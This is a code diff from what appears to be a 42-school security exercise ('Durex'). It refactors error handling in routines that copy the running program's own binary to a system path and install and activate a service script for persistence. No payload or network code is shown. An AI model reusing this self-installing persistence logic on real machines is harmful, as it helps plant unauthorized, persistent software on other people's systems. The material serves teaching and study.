@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2019/08/04 04:34:13 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/08/06 00:51:45 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,10 +21,8 @@
 
 #include "main.h"
 
-static int		install_error(int fd)
+static int		install_error()
 {
-	if (fd != -1)
-		close(fd);
 	remove(DUREX_BINARY_FILE);
 	remove(DUREX_SERVICE_FILE);
 	return 1;
@@ -75,30 +73,28 @@ static int		modify_binary(void *data)
 int			install_binary()
 {
 	int		durex;
-	int		bin;
+	int		len;
 	void	*data;
 	int		size;
 
-	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
-	if (bin < 0)
-		return install_error(-1);
 	if ((durex = open(e.prog, O_RDONLY)) == -1)
-		return install_error(bin);
+		return install_error();
 	size = lseek(durex, 1, SEEK_END);
 	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
 	close(durex);
 	if (size == -1 || data == MAP_FAILED)
-		return install_error(bin);
+		return install_error();
 	if (modify_binary(data)) {
 		munmap(data, size);
-		return install_error(bin);
+		return install_error();
 	}
-	durex = write(bin, data, size);
-	close(bin);
+	durex = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
+	if (durex < 0)
+		return install_error();
+	len = write(durex, data, size);
+	close(durex);
 	munmap(data, size);
-	if (durex != size)
-		return install_error(-1);
-	return 0;
+	return (len != size) ? install_error() : 0;
 }
 
 int			install_service()
@@ -108,12 +104,12 @@ int			install_service()
 	
 	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
 	if (fd < 0)
-		return install_error(-1);
+		return install_error();
 	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
 	close(fd);
 	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
-		return install_error(-1);
+		return install_error();
 	if (system(DUREX_SERVICE_ACTIVATE))
-		return install_error(-1);
+		return install_error();
 	return 0;
 }
